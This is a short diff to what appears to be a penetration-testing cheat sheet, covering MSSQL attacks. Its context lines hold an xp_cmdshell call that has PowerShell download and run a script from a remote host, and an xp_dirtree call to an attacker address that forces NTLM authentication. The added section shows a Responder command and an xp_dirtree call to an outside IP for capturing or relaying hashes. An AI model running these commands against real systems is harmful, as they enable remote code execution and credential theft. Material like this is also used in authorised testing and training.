@@ -175,6 +175,16 @@ EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''
 EXEC master..xp_dirtree '\\<attacker_ip>\share';   -- forces auth attempt, capture with responder/ntlmrelayx
 ```
 
+### NTLM Relay with Responder
+
+```sh
+sudo responder -I tun0 -A -v
+```
+
+```sh
+SQL > xp_dirtree \\10.10.14.57\shares
+```
+
 ---
 
 ## 6. Port 3306 — MySQL
